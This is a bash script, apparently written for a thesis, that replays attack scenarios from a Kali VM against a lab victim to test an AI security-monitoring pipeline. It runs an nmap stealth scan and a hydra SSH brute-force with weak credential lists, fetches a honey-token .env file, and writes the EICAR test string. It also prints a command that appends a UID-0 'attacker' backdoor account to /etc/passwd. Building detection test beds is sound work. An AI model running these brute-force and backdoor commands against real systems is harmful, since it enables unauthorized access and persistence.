#!/usr/bin/env bash
# ==============================================================================
# Script: 05_kali_attack_scenarios.sh
# Purpose: Reproduces the 9 attack evaluation scenarios tested in the thesis
# Origin: Kali Linux VM (VMnet3: 192.168.52.100 / Gateway: 192.168.52.254)
# Target: Ubuntu Victim Node (10.0.0.20 via Router R1)
# ==============================================================================

set -euo pipefail

TARGET_IP="10.0.0.20"

echo "=================================================================="
echo " AI SOC Pipeline: Attack Reproduction Scenarios"
echo " Target IP: ${TARGET_IP}"
echo "=================================================================="

# Scenario 1: Port Scanning & Reconnaissance
run_recon() {
    echo "[*] Scenario 1: Running Nmap SYN Stealth Port Scan..."
    nmap -sS -p 21,22,80,443,2222,8080 "${TARGET_IP}"
}

# Scenario 2: SSH Brute-Force Simulation
run_brute_force() {
    echo "[*] Scenario 2: Running Hydra SSH Brute-Force against port 22..."
    cat << 'EOF' > /tmp/users.txt
root
admin
hassan
user
EOF

    cat << 'EOF' > /tmp/passwords.txt
123456
password
admin123
toor
hh666
EOF

    hydra -L /tmp/users.txt -P /tmp/passwords.txt "ssh://${TARGET_IP}" -t 4 -V || true
}

# Scenario 3: Privilege Escalation & Persistence Simulation (FIM Test)
run_persistence_injection() {
    echo "[*] Scenario 3: Simulating Unauthorized Root Backdoor Injection into /etc/passwd..."
    echo "[*] Command to be run on compromised victim:"
    echo "    sudo bash -c 'echo \"attacker:x:0:0::/home/attacker:/bin/bash\" >> /etc/passwd'"
}

# Scenario 4: Honey-Token Access Simulation
run_honey_token_access() {
    echo "[*] Scenario 4: Simulating Attacker Exfiltrating Honey-Token Credentials..."
    curl -s "http://${TARGET_IP}/adaptive_honey_token.env" || true
}

# Scenario 5: EICAR Standard Antivirus & Malware Detection Test
run_eicar_test() {
    echo "[*] Scenario 5: Injecting Standard EICAR Antivirus Test Signature..."
    echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
}

echo "Select attack scenario to execute:"
echo "1) Reconnaissance / Nmap Port Scan"
echo "2) SSH Brute-Force (Hydra)"
echo "3) Privilege Escalation / Persistence (/etc/passwd)"
echo "4) Honey-Token Access"
echo "5) EICAR Test Payload"
echo "6) Execute All"

read -p "Enter choice [1-6]: " choice

case "${choice}" in
    1) run_recon ;;
    2) run_brute_force ;;
    3) run_persistence_injection ;;
    4) run_honey_token_access ;;
    5) run_eicar_test ;;
    6)
        run_recon
        run_brute_force
        run_honey_token_access
        run_persistence_injection
        run_eicar_test
        ;;
    *) echo "Invalid choice." ;;
esac
